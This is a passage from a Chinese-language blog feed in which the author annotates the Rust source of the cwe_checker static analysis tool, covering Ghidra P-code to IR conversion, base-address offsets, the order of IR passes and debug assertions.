function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                    size<span class="token punctuation">:</span> <span class="token class-name">ByteSize</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                    is_temp<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>                                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                                value<span class="token punctuation">:</span> <span class="token class-name">Expression</span><span class="token punctuation">::</span><span class="token class-name">Var</span><span class="token punctuation">(</span><span class="token class-name">Variable</span> <span class="token punctuation">&#123;</span>                                    name<span class="token punctuation">:</span> <span class="token string">"temp_RSP_new"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                    size<span class="token punctuation">:</span> <span class="token class-name">ByteSize</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                    is_temp<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                        <span class="token comment">// 操作 3：存储 RBP 到栈</span>                        <span class="token class-name">Term</span><span class="token operator">&lt;</span><span class="token class-name">Def</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>                            tid<span class="token punctuation">:</span> <span class="token class-name">Tid</span> <span class="token punctuation">&#123;</span>                                id<span class="token punctuation">:</span> <span class="token string">"instr_0x00401000_2"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                address<span class="token punctuation">:</span> <span class="token class-name">TidAddress</span><span class="token punctuation">(</span><span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token number">0x00401000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                            term<span class="token punctuation">:</span> <span class="token class-name">Def</span><span class="token punctuation">::</span><span class="token class-name">Store</span> <span class="token punctuation">&#123;</span>                                address<span class="token punctuation">:</span> <span class="token class-name">Expression</span><span class="token punctuation">::</span><span class="token class-name">Var</span><span class="token punctuation">(</span><span class="token class-name">Variable</span> <span class="token punctuation">&#123;</span>                                    name<span class="token punctuation">:</span> <span class="token string">"register_RSP_64"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                    size<span class="token punctuation">:</span> <span class="token class-name">ByteSize</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                    is_temp<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>                                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                value<span class="token punctuation">:</span> <span class="token class-name">Expression</span><span class="token punctuation">::</span><span class="token class-name">Var</span><span class="token punctuation">(</span><span class="token class-name">Variable</span> <span class="token punctuation">&#123;</span>                                    name<span class="token punctuation">:</span> <span class="token string">"register_RBP_64"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                    size<span class="token punctuation">:</span> <span class="token class-name">ByteSize</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                    is_temp<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>                                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                    <span class="token punctuation">]</span><span class="token punctuation">,</span>                    jmps<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    indirect_control_flow_targets<span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        calling_convention<span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span>        non_returning<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>计算 ghidra 中的基址和实际基址的差值得到偏移 address_base_offset（仅在成功获取基址的情况下计算，否则 project 中的  address_base_offset &#x3D; 0）</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// 计算地址基址偏移量（Ghidra 报告的基址与实际基址的差值）</span><span class="token keyword">let</span> address_base_offset <span class="token operator">=</span><span class="token comment">// 将 image_base 字符串（去掉 "0x" 前缀）解析为十六进制 u64</span><span class="token keyword">match</span> <span class="token keyword">u64</span><span class="token punctuation">::</span><span class="token function">from_str_radix</span><span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>image_base<span class="token punctuation">.</span><span class="token function">trim_start_matches</span><span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">checked_sub</span><span class="token punctuation">(</span>binary_base_address<span class="token punctuation">)</span> <span class="token comment">// 安全地计算差值（防止下溢）</span><span class="token punctuation">&#123;</span>    <span class="token class-name">Some</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">=></span> a<span class="token punctuation">,</span> <span class="token comment">// 如果计算成功，使用差值</span>    <span class="token class-name">None</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>     <span class="token comment">// 如果下溢（Ghidra 报告的基址小于实际基址）</span>        logs<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token class-name">LogMessage</span><span class="token punctuation">::</span><span class="token function">new_info</span><span class="token punctuation">(</span><span class="token macro property">format!</span><span class="token punctuation">(</span> <span class="token comment">// 添加警告日志</span>        <span class="token string">"Base address reported by Ghidra is smaller than actual base address: &#123;&#125; vs 0x&#123;:x&#125;"</span><span class="token punctuation">,</span>        <span class="token keyword">self</span><span class="token punctuation">.</span>image_base<span class="token punctuation">,</span> binary_base_address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 记录 Ghidra 报告的基址和实际基址</span>        <span class="token number">0</span> <span class="token comment">// 使用 0 作为偏移量</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>创建初始的 IR 程序结构</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// 创建初始的 IR 程序结构 </span><span class="token keyword">let</span> <span class="token keyword">mut</span> ir_program <span class="token operator">=</span> <span class="token class-name">IrProgram</span> <span class="token punctuation">&#123;</span>    subs<span class="token punctuation">:</span> ir_function_terms_map<span class="token punctuation">,</span> <span class="token comment">// 函数项映射表（函数 TID -> 函数项）</span>    extern_symbols<span class="token punctuation">:</span> <span class="token keyword">self</span>         <span class="token comment">// 外部符号（导入的函数）</span>    <span class="token punctuation">.</span>external_functions      <span class="token comment">// 从外部函数映射中</span>    <span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token comment">// 获取所有值（ExternFunction）</span>    <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>ext_fn<span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>          <span class="token comment">// 将每个外部函数转换为 IR 外部符号</span>        <span class="token keyword">let</span> ext_sym <span class="token operator">=</span> ext_fn<span class="token punctuation">.</span><span class="token function">to_ir_extern_symbol</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 转换为 IR 外部符号</span>        <span class="token punctuation">(</span>ext_sym<span class="token punctuation">.</span>tid<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ext_sym<span class="token punctuation">)</span> <span class="token comment">// 返回 (TID, 外部符号) 元组</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment">// 收集为 HashMap</span>    <span class="token comment">// 将入口点字符串转换为函数 TID 列表</span>    entry_points<span class="token punctuation">:</span> <span class="token keyword">self</span><span class="token punctuation">.</span>entry_points<span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token class-name">Tid</span><span class="token punctuation">::</span>new_function<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>     address_base_offset<span class="token punctuation">,</span> <span class="token comment">// 地址基址偏移量</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 打印早期 IR 表示</span>debug_settings<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ir_program<span class="token punctuation">,</span> <span class="token namespace">debug<span class="token punctuation">::</span></span><span class="token class-name">Stage</span><span class="token punctuation">::</span><span class="token class-name">Ir</span><span class="token punctuation">(</span><span class="token namespace">debug<span class="token punctuation">::</span></span><span class="token class-name">IrForm</span><span class="token punctuation">::</span><span class="token class-name">Early</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用的 IrProgram 结构体如下（与self.program 不是同一个结构体，位于 src\cwe_checker_lib\src\intermediate_representation\program.rs）：</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">struct</span> <span class="token type-definition class-name">Program</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 二进制文件中包含的已知函数，存放程序转化的 IR 函数映射表</span>    <span class="token keyword">pub</span> subs<span class="token punctuation">:</span> <span class="token class-name">BTreeMap</span><span class="token operator">&lt;</span><span class="token class-name">Tid</span><span class="token punctuation">,</span> <span class="token class-name">Term</span><span class="token operator">&lt;</span><span class="token class-name">Sub</span><span class="token operator">>></span><span class="token punctuation">,</span>    <span class="token comment">// 链接器链接到二进制文件的 extern 符号，从 PcodeProject 的 external_functions 获取所有外部符号</span>    <span class="token keyword">pub</span> extern_symbols<span class="token punctuation">:</span> <span class="token class-name">BTreeMap</span><span class="token operator">&lt;</span><span class="token class-name">Tid</span><span class="token punctuation">,</span> <span class="token class-name">ExternSymbol</span><span class="token operator">></span><span class="token punctuation">,</span>     <span class="token comment">// 二进制文件的入口点，从 PcodeProject 的 entry_points 获取</span>    <span class="token keyword">pub</span> entry_points<span class="token punctuation">:</span> <span class="token class-name">BTreeSet</span><span class="token operator">&lt;</span><span class="token class-name">Tid</span><span class="token operator">></span><span class="token punctuation">,</span>    <span class="token comment">// ghidra 与程序实际基址的偏移量</span>    <span class="token keyword">pub</span> address_base_offset<span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>运行 IR Pass 顺序执行多个独立的处理单元，对 IR 进行转换和优化</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token macro property">run_ir_pass!</span><span class="token punctuation">[</span>    ir_program<span class="token punctuation">,</span>        <span class="token comment">// 要转换的 IR 程序（可变的）</span>    construction_input<span class="token punctuation">,</span> <span class="token comment">// 构造传递所需的输入（通常是寄存器映射等上下文信息）</span>    <span class="token class-name">PassType</span><span class="token punctuation">,</span>          <span class="token comment">// 传递的类型</span>    logs<span class="token punctuation">,</span>              <span class="token comment">// 日志向量，用于收集处理过程中的消息</span>    debug_settings     <span class="token comment">// 调试设置，控制调试输出</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>SingleTargetIndirectCallsPass：只有单个可能的调用目标时，将间接调用替换为直接调用</li><li>ReorderFnBlocksPass：按执行顺序流重新将 ghidra 得到的基本块顺序进行排列</li><li>ReplaceCallsToExtFnsPass：将对外部函数存根（stub）的调用替换为对外部符号的实际调用</li><li>SubregisterSubstitutionPass：将子寄存器的引用替换为基寄存器</li><li>InliningPass：将简单或简短的函数内联到调用处，替换对函数的调用</li><li>NoreturnExtFunctionsPass：标记不会返回的外部函数，执行到这些函数会终止程序</li><li>RemoveEmptyFunctionsPass：移除空函数</li><li>PatchCfPass：修复控制流，移除无效的跳转，确保跳转目标都有效、控制流图完整</li><li>EntryPointsPass：移除不存在的入口点，确保入口点列表只包含实际存在的函数</li></ul><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// 运行 IR 优化传递（Passes），按顺序应用各种转换和优化</span>    <span class="token macro property">run_ir_pass!</span><span class="token punctuation">[</span> <span class="token comment">// 运行 IR 传递：单目标间接调用替换</span>        ir_program<span class="token punctuation">,</span> <span class="token comment">// 要转换的 IR 程序</span>        <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// 传递的上下文参数（无）</span>        <span class="token class-name">SingleTargetIndirectCallsPass</span><span class="token punctuation">,</span> <span class="token comment">// 将只有单个目标的间接调用替换为直接调用</span>        logs<span class="token punctuation">,</span> <span class="token comment">// 日志向量</span>        debug_settings <span class="token comment">// 调试设置</span>    <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 运行 IR 传递：重新排序函数内的基本块（按正常顺序）</span>    <span class="token macro property">run_ir_pass!</span><span class="token punctuation">[</span>ir_program<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">ReorderFnBlocksPass</span><span class="token punctuation">,</span> logs<span class="token punctuation">,</span> debug_settings<span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token comment">// 运行 IR 传递：将外部函数存根调用替换为外部函数调用</span>    <span class="token macro property">run_ir_pass!</span><span class="token punctuation">(</span>ir_program<span class="token punctuation">,</span> <span class="token class-name">ReplaceCallsToExtFnsPass</span><span class="token punctuation">,</span> logs<span class="token punctuation">,</span> debug_settings<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token macro property">run_ir_pass!</span><span class="token punctuation">[</span> <span class="token comment">// 运行 IR 传递：子寄存器替换</span>        ir_program<span class="token punctuation">,</span> <span class="token comment">// 要转换的 IR 程序</span>        register_map<span class="token punctuation">,</span> <span class="token comment">// 传递寄存器映射作为上下文</span>        <span class="token class-name">SubregisterSubstitutionPass</span><span class="token punctuation">,</span> <span class="token comment">// 将子寄存器引用替换为基寄存器引用</span>        logs<span class="token punctuation">,</span> <span class="token comment">// 日志向量</span>        debug_settings <span class="token comment">// 调试设置</span>    <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 运行 IR 传递：内联现有引用的块到函数中</span>    <span class="token macro property">run_ir_pass!</span><span class="token punctuation">(</span>ir_program<span class="token punctuation">,</span> <span class="token class-name">InliningPass</span><span class="token punctuation">,</span> logs<span class="token punctuation">,</span> debug_settings<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 运行 IR 传递：标记非返回的外部函数</span>    <span class="token macro property">run_ir_pass!</span><span class="token punctuation">(</span>ir_program<span class="token punctuation">,</span> <span class="token class-name">NoreturnExtFunctionsPass</span><span class="token punctuation">,</span> logs<span class="token punctuation">,</span> debug_settings<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 运行 IR 传递：移除空函数</span>    <span class="token macro property">run_ir_pass!</span><span class="token punctuation">(</span>ir_program<span class="token punctuation">,</span> <span class="token class-name">RemoveEmptyFunctionsPass</span><span class="token punctuation">,</span> logs<span class="token punctuation">,</span> debug_settings<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 运行 IR 传递：修复控制流（确保所有控制流转换都有有效目标）</span>    <span class="token macro property">run_ir_pass!</span><span class="token punctuation">(</span>ir_program<span class="token punctuation">,</span> <span class="token class-name">PatchCfPass</span><span class="token punctuation">,</span> logs<span class="token punctuation">,</span> debug_settings<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 运行 IR 传递：移除不存在的入口点</span>    <span class="token macro property">run_ir_pass!</span><span class="token punctuation">[</span>ir_program<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">EntryPointsPass</span><span class="token punctuation">,</span> logs<span class="token punctuation">,</span> debug_settings<span class="token punctuation">]</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>调用 debug_assert_postconditions 断言各个传递的后置条件，验证传递的正确性</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust">   <span class="token comment">// 在调试模式下断言各个传递的后置条件（验证传递的正确性）</span>      <span class="token comment">// 断言单目标间接调用替换的后置条件</span>      <span class="token macro property">debug_assert_postconditions!</span><span class="token punctuation">[</span>ir_program<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">SingleTargetIndirectCallsPass</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token comment">// 断言基本块重排序的后置条件</span>      <span class="token macro property">debug_assert_postconditions!</span><span class="token punctuation">[</span>ir_program<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">ReorderFnBlocksPass</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token comment">// 断言外部函数调用替换的后置条件</span>      <span class="token macro property">debug_assert_postconditions!</span><span class="token punctuation">(</span>ir_program<span class="token punctuation">,</span> <span class="token class-name">ReplaceCallsToExtFnsPass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// 断言子寄存器替换的后置条件</span>      <span class="token macro property">debug_assert_postconditions!</span><span class="token punctuation">[</span>ir_program<span class="token punctuation">,</span> register_map<span class="token punctuation">,</span> <span class="token class-name">SubregisterSubstitutionPass</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 断言内联传递的后置条件</span>      <span class="token macro property">debug_assert_postconditions!</span><span class="token punctuation">(</span>ir_program<span class="token punctuation">,</span> <span class="token class-name">InliningPass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// 断言非返回函数标记的后置条件</span>      <span class="token macro property">debug_assert_postconditions!</span><span class="token punctuation">(</span>ir_program<span class="token punctuation">,</span> <span class="token class-name">NoreturnExtFunctionsPass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// 断言空函数移除的后置条件</span>      <span class="token macro property">debug_assert_postconditions!</span><span class="token punctuation">(</span>ir_program<span class="token punctuation">,</span> <span class="token class-name">RemoveEmptyFunctionsPass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 断言控制流修复的后置条件</span>      <span class="token macro property">debug_assert_postconditions!</span><span class="token punctuation">(</span>ir_program<span class="token punctuation">,</span> <span class="token class-name">PatchCfPass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 断言入口点处理的后置条件</span>      <span class="token macro property">debug_assert_postconditions!</span><span class="token punctuation">[</span>ir_program<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">EntryPointsPass</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token comment">// 断言 IR 程序的不变量，验证程序的完整性，确保所有基本快 TID 唯一，所有跳转目标存在，所有函数调用约定有效</span>      ir_program<span class="token punctuation">.</span><span class="token function">debug_assert_invariants</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>创建并返回 Project 结构体实例</p></li></ul><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust">        <span class="token comment">// 创建最终的 IR Project（项目）结构</span>        <span class="token keyword">let</span> ir_project <span class="token operator">=</span> <span class="token class-name">IrProject</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 创建程序项，使用程序基址作为 TID</span>            program<span class="token punctuation">:</span> <span class="token class-name">IrTerm</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token class-name">Tid</span><span class="token punctuation">::</span><span class="token function">new_program</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>image_base<span class="token punctuation">)</span><span class="token punctuation">,</span> ir_program<span class="token punctuation">)</span><span class="token punctuation">,</span>             cpu_architecture<span class="token punctuation">:</span> <span class="token keyword">self</span><span class="token punctuation">.</span>cpu_arch<span class="token punctuation">,</span> <span class="token comment">// CPU 架构名称</span>            <span class="token comment">// 将栈指针寄存器 Varnode 转换为 IR 变量</span>            stack_pointer_register<span class="token punctuation">:</span> <span class="token keyword">self</span><span class="token punctuation">.</span>stack_pointer_register<span class="token punctuation">.</span><span class="token function">to_ir_var</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>             calling_conventions<span class="token punctuation">:</span> <span class="token keyword">self</span> <span class="token comment">// 调用约定</span>                <span class="token punctuation">.</span>calling_conventions <span class="token comment">// 从调用约定映射中</span>                <span class="token punctuation">.</span><span class="token function">into_iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 转换为迭代器（消耗所有权）</span>                <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span><span class="token punctuation">(</span>cconv_name<span class="token punctuation">,</span> cconv<span class="token punctuation">)</span><span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span> <span class="token comment">// 将每个调用约定转换为 IR 调用约定</span>                    <span class="token punctuation">(</span>                        cconv_name<span class="token punctuation">,</span> <span class="token comment">// 调用约定名称（键）</span>                        cconv <span class="token comment">// 调用约定对象</span>                            <span class="token punctuation">.</span><span class="token function">to_ir_calling_convention</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>register_map<span class="token punctuation">)</span> <span class="token comment">// 转换为 IR 调用约定</span>                            <span class="token punctuation">.</span><span class="token function">move_logs_to</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> logs<span class="token punctuation">)</span> <span class="token comment">// 将日志移动到 logs 向量</span>                            <span class="token punctuation">.</span><span class="token function">into_object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// 提取对象（从 WithLogs 中）</span>                    <span class="token punctuation">)</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// 收集为 HashMap</span>            register_set<span class="token punctuation">:</span> register_map<span class="token punctuation">.</span><span class="token function">get_base_reg_ir_vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// 获取基础寄存器的 IR 变量集合</span>            <span class="token comment">// 将数据类型属性转换为 IR 数据类型属性</span>            datatype_properties<span class="token punctuation">:</span> <span class="token keyword">self</span><span class="token punctuation">.</span>datatype_properties<span class="token punctuation">.</span><span class="token function">into</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>             <span class="token comment">// 创建空的运行时内存映像（小端序）</span>            runtime_memory_image<span class="token punctuation">:</span> <span class="token class-name">IrRuntimeMemoryImage</span><span class="token punctuation">::</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span>         <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name">WithLogs</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>ir_project<span class="token punctuation">,</span> logs<span class="token punctuation">)</span> <span class="token comment">// 返回带日志的 IR Project</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="cwe-checker-lib-x2F-src-x2F-analysis-x2F-graph-x2F-call-rs"><a href="#cwe-checker-lib-x2F-src-x2F-analysis-x2F-graph-x2F-call-rs" class="headerlink" title="cwe_checker_lib&#x2F;src&#x2F;analysis&#x2F;graph&#x2F;call.rs"></a>cwe_checker_lib&#x2F;src&#x2F;analysis&#x2F;graph&#x2F;call.rs</h3><h3 id="src-x2F-caller-x2F-src-x2F-cfg-stats-rs"><a href="#src-x2F-caller-x2F-src-x2F-cfg-stats-rs" class="headerlink" title="src&#x2F;caller&#x2F;src&#x2F;cfg_stats.rs"></a>src&#x2F;caller&#x2F;src&#x2F;cfg_stats.rs</h3><h3 id="src-cwe-checker-lib-src-analysis-graph-rs"><a href="#src-cwe-checker-lib-src-analysis-graph-rs" class="headerlink" title="src\cwe_checker_lib\src\analysis\graph.rs"></a>src\cwe_checker_lib\src\analysis\graph.rs</h3><h3 id="src-cwe-checker-lib-src-pipeline-results-rs"><a href="#src-cwe-checker-lib-src-pipeline-results-rs" class="headerlink" title="src\cwe_checker_lib\src\pipeline\results.rs"></a>src\cwe_checker_lib\src\pipeline\results.rs</h3><h3 id="src-cwe-checker-lib-src-checkers（cwe-modules）"><a href="#src-cwe-checker-lib-src-checkers（cwe-modules）" class="headerlink" title="*src\cwe_checker_lib\src\checkers（cwe modules）"></a>*src\cwe_checker_lib\src\checkers（cwe modules）</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;实习的时候刚好接触到这个工具，想着学一下静态分析，网上也没搜到相关源码分析…只能自己看了orz，还特地学了一周 rust 哈哈哈&lt;/p&gt;
&lt;h2 id=&quot;前置知识&quot;&gt;&lt;a href=&quot;#前置知识&quot; class=&quot;headerlink&quot; title=&quot;前置知识&quot;&gt;&lt;/a&gt;前置</summary>
      
    
    
    
    <category term="静态分析" scheme="https://starrysky1004.github.io/categories/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/"/>
    
    
    <category term="cwe_checker" scheme="https://starrysky1004.github.io/tags/cwe-checker/"/>
    
    <category term="静态分析" scheme="https://starrysky1004.github.io/tags/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>AWDP赛制流程与技巧</title>
    <link href="https://starrysky1004.github.io/2025/04/06/awdp-sai-zhi-liu-cheng-yu-ji-qiao/"/>
    <id>https://starrysky1004.github.io/2025/04/06/awdp-sai-zhi-liu-cheng-yu-ji-qiao/</id>
    <published>2025-04-06T08:43:52.000Z</published>
    <updated>2025-04-06T08:46:52.237Z</updated>
    
